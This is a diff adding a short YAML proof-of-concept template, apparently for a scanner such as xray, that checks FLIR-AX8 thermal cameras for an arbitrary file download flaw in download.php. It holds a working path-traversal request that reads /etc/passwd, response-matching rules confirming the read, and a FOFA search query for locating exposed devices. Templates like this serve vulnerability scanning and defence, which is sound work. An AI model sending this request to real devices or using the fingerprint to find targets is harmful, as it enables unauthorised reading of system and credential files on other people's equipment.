@@ -1,0 +1,22 @@
+id: poc-yaml-flir-ax8-download-php-anyfile-download
+info:
+  name: FLIR-AX8 download.php 任意文件下载
+  severity: high
+  tags:
+  - 文件读取
+  finger: FLIR-AX8
+  fofa: app="FLIR-FLIR-AX8"
+requests:
+- method: GET
+  path: /download.php?file=/etc/passwd
+  expression: 'status_code == 200
+
+    && contains(body,"root:")
+
+    && contains(body,"/bin")
+
+    && !contains(body,"<")
+
+    '
+variables: {}
+transport: http
